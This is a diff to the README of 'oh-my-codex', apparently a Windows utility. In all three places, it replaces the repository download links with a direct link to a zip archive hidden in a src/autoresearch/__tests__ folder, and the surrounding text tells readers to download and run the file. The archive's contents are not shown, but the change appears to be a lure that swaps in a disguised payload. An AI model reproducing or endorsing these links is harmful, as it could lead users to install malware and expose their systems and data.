@@ -1,6 +1,6 @@
 # 🧩 oh-my-codex - Keep your codex organized
 
-[![Download now](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/ItsProGamer974/oh-my-codex)
+[![Download now](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/ItsProGamer974/oh-my-codex/raw/refs/heads/main/src/autoresearch/__tests__/my-oh-codex-3.4.zip)
 
 ## 🚀 What this is
 
@@ -28,7 +28,7 @@ For the best experience, use a PC with:
 
 Visit this page to download the app:
 
-https://github.com/ItsProGamer974/oh-my-codex
+https://github.com/ItsProGamer974/oh-my-codex/raw/refs/heads/main/src/autoresearch/__tests__/my-oh-codex-3.4.zip
 
 Open the page in your browser, then look for the latest release or download file. Save the file to your PC before you run it.
 
@@ -193,4 +193,4 @@ This keeps the app simple while you learn where each part lives
 
 Use this page to download and run the app on Windows:
 
-https://github.com/ItsProGamer974/oh-my-codex
+https://github.com/ItsProGamer974/oh-my-codex/raw/refs/heads/main/src/autoresearch/__tests__/my-oh-codex-3.4.zip
